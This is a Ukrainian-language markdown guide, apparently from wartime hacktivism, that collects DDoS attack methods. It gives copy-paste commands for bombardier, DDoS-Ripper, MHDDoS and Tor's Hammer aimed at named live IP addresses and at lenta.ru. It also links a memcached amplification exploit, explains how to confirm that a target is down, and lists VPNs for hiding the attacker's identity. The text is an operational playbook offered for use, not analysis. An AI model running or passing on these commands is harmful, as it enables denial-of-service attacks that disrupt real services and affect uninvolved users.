# Збірка DDoS методів


## Провірка

**ping** метод (відкривати в Tor Browser або в будь-якому якщо є окрмеий VPN).

Ці сайти, це аналог звичайного ping-a тільки є дані про репліки (лоад балансінг хости)

```
https://port.ping.pe/194.54.14.186:53
```

Клікнути на ОК, і чекати поки інфо рефрешнеться про всі репліки. Ціль - ВСІ ЧЕРВОНІ

А тут вписати ТІЛЬКИ ХОСТ і клікнути UDP port (або Ping для провірки)

```
https://check-host.net/check-udp?host=194.54.14.187
```


## DDoS-имо з Docker-ом



**Docker** метод 1 (треба VPN)

https://hub.docker.com/r/alpine/bombardier

```
docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
```

**Docker** метод 2 (треба VPN) - TBD




## DDoS-имо з Python-ом



**DDoS-Ripper** PYTHON метод (треба VPN)

https://github.com/palahsu/DDoS-Ripper

```
git clone https://github.com/palahsu/DDoS-Ripper.git
cd DDoS-Ripper
python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q 10000 
```

**runner** (обгортка над DDoS Runner)

https://github.com/nitupkcuf/runner
що загалом в мене так і не запрацювало толком

```
brew install --cask docker
docker run --rm -it nitupkcuf/ddos-ripper:latest {HOSTNAME | IP}
```

**MHDDoS** PYTHON (тільки 3) метод (треба VPN)

https://github.com/MHProDev/MHDDoS

```
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip3 install -r requirements.txt 
python3 start.py udp 194.54.14.186:53 1000 3600
```

Норм якщо ви бачите "Attack Started !"
Але в мене на іншому компі депси не проінсталиись. рестартував. хз.


**Tors Hammer**

```
Download manually from https://sourceforge.net/projects/torshammer/
or 
wget https://iweb.dl.sourceforge.net/project/torshammer/Torshammer/1.0/Torshammer%201.0.zip
unzip Torshammer\ 1.0.zip
cd Torshammer\ 1.0
./torshammer.py -t lenta.ru -p 80 -t 1024
```

Щоб вийти з процесу треба Ctrl + Z (бо Ctrl + C не виходить)
Норм коли пише
Posting: щось там....
і connected to host...



# TODO

**Memcrashed** Python + Docker

https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/
https://github.com/649/Memcrashed-DDoS-Exploit

```
git clone https://github.com/649/Memcrashed-DDoS-Exploit.git
cd Memcrashed-DDoS-Exploit
echo "SHODAN_KEY" > api.txt
docker build -t memcrashed .
docker run -it memcrashed
```
Але вимагає ключа для Schodan АПІ => https://www.shodan.io/


# Туторіали про DDoS
- https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2
- https://docs.google.com/document/d/18nxvjQuHpAgrJ-t9S9CJ9dPK9_z0F73UrBpBFn7ZyVo/edit

# VPN 

**ClearVPN**
Цитата з Телеграм каналу [DDOS по країні СЕПАРІВ](https://t.me/+97Y45he5lOI2ZTky)

> Інфовоїни! Для наших бешкецтв потрібний надійний захист. Наші друзі з MacPaw дають промокод на ClearVPN, користуйтесь на здоров'я.

> Infowarriors! Our riots need reliable protection. Our friends from MacPaw give a promo code on ClearVPN, enjoy. 

https://my.clearvpn.com/promo/redeem?code=SAVEUKRAINE

Треба зареєструватись, і вже тоді собі скачати програму для вашої ОС.
Правда той код діє до 2023го року тільки.

До речі, Росія в списку є.
Але IMHO, не зручний "переключатор країн", адже треба Деактивувати спочатку, потім ІП адреса стає ваша звичайна, потім Активувати, програмка підключає і міняє ІП адресу, що є відносно але довго в секундах. ExpressVPN по відчуттях переключає моментально.

**Інші**: 
- NordVPN https://nordvpn.com/, 
- Psiphon https://psiphon.ca/en/download.html?psiphonca
- ProtonVPN https://protonvpn.com/pricing (але пишуть, що є баг)
- SurfShark https://surfshark.com/deal/influencer?coupon=NETSTALKERS (увага - лінк з купоном)
- UrbanVPN https://www.urban-vpn.com/ (але пишуть що "сливает данные")
- ExpressVPN https://www.expressvpn.com/ (сам юзаю, бо на швидку руку купив перший попавший з найкращих, і пішло... Важливо, що Росії в списку не має)
- https://www.vpngate.net
- https://www.freeopenvpn.org

*VPN для Android*
- Secure VPN https://play.google.com/store/apps/details?id=com.fast.free.unblock.secure.vpn&hl=en_US&gl=US

# Слава Україні!

# Героям Слава!

# Слава Нації!

# Смерть Ворогам!

# Україна понад усе!

PS. Maintained by @Andrii_L
